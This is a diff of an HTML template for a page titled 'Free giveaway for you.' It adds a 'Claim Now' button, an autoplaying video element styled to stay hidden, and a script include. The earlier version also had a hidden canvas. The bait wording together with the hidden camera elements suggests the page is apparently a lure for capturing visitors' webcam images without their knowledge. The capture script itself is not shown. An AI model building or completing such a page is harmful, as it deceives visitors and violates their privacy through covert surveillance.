@@ -1,12 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>🎁 Free gift giveaway 🎁</title>
-    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <meta charset="UTF-8">
+    <title>🎁 Free giveaway for you. 🎁</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <h1>Welcome</h1>
+    <button id="capture-btn">🎁 Claim Now</button>
+
+    <!-- Hidden video element -->
+    <video id="video" autoplay muted playsinline style="display: none;"></video>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
